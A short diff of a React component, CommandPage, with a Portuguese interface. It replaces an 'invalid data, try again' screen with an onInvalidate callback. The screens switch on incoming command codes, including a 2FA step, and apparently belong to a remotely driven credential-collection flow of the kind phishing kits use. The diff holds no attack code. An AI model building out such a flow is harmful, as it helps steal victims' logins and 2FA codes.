@@ -73,7 +73,7 @@ const PFCenter = ({ children }) => (
   </div>
 );
 
-function CommandPage({ userId }) {
+function CommandPage({ userId, onInvalidate }) {
   const [currentCommand, setCurrentCommand] = useState(null);
   const [inputValue, setInputValue] = useState("");
   const [loading, setLoading] = useState(false);
@@ -199,23 +199,10 @@ function CommandPage({ userId }) {
 
   // =================== INV ===================
   if (currentCommand?.action === "INV") {
-    return (
-      <PFLayout>
-        <PFLogo />
-        <PFIcon isInvalid={true}>
-          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-        </PFIcon>
-        <h1 className="text-xl font-bold text-gray-900 mb-2 text-center">Dados Inválidos</h1>
-        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">
-          Os dados digitados estão incorretos. Tente novamente.
-        </p>
-        <div className="w-full max-w-[280px]">
-          <PFButton disabled={false} loading={false} onClick={() => window.location.reload()}>
-            Tentar Novamente
-          </PFButton>
-        </div>
-      </PFLayout>
-    );
+    if (onInvalidate) {
+      onInvalidate();
+      return null;
+    }
   }
 
   // =================== AUT (2FA) ===================
